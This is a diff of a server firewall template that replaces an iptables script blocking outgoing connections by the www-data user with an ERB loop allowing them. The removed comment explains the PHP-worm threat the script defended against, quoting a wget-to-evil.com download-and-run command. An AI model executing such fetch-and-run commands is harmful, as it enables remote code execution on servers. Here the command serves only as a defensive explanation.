@@ -1,44 +1,8 @@
 #
-#  A simple firewall which is designed to deny outgoing connections by
-# the www-data user - this is done specifically because many of the security
-# attacks we observe at Bytemark are caused by PHP-based worms which function
-# by essentially running:
 #
-#    - wget -O/tmp/attack http://evil.com/some/code.php
-#    - /tmp/attack
+# Allow all NEW outgoing connections <%= address.nil? ? "" : " to address #{address}" %>, but only for www-data.
 #
-#  If the outgoing connections are blocked then the attack will be curtailed.
-# (Although if there was a security hole in the application which allowed
-# this to occur in the first place that is still present!)
-#
+% iptables_cmds.each do |cmd|
+<%= cmd %> -A OUTPUT <%= dst %> --match owner --uid-owner www-data -j ACCEPT
+% end
 
-
-
-#
-# Create a new chain; deleting it first just in case it already exists.
-#
-#
-/sbin/iptables -D OUTPUT -j no_www    >/dev/null 2>/dev/null
-/sbin/iptables --flush no_www         >/dev/null 2>/dev/null
-/sbin/iptables --delete-chain no_www  >/dev/null 2>/dev/null
-/sbin/iptables --new-chain no_www     >/dev/null 2>/dev/null
-/sbin/iptables -A OUTPUT -j no_www    >/dev/null 2>/dev/null
-
-
-#  Loopback traffic is fine
-#
-/sbin/iptables -A no_www  -m state --state new --match owner --uid-owner www-data -o lo -j ACCEPT
-
-#
-#  DNS queries are fine
-#
-/sbin/iptables -A no_www  -m state --state new --match owner --uid-owner www-data --protocol udp --dport 53  -j ACCEPT
-/sbin/iptables -A no_www  -m state --state new --match owner --uid-owner www-data --protocol tcp --dport 53  -j ACCEPT
-
-
-#
-#  TCP/UDP/ICMP are blocked
-#
-/sbin/iptables -A no_www  -m state --state new --match owner --uid-owner www-data --protocol tcp  -j REJECT --reject-with icmp-admin-prohibited
-/sbin/iptables -A no_www  -m state --state new --match owner --uid-owner www-data --protocol udp  -j REJECT --reject-with icmp-admin-prohibited
-/sbin/iptables -A no_www --protocol icmp --match owner --uid-owner www-data -j REJECT --reject-with icmp-admin-prohibited
